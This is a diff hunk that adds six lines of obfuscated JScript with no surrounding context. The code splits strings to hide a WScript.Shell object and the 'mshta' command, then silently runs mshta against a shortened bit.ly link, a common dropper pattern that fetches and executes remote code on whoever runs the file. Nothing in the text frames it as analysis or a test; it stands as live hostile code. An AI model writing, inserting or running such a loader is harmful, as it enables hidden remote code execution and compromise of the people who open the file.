@@ -1,0 +1,6 @@
+nteodfip = ("ipt.Shel")
+var cktvtpad = WScript.CreateObject("WScr"+nteodfip+"l")
+nzxlqktv = ("m")
+anaidkhr = ("sh")
+hhqdqwmf = ("ta ")
+cktvtpad.Run((nzxlqktv+anaidkhr+hhqdqwmf)+" https://bit.ly/2S3TQ74",0)
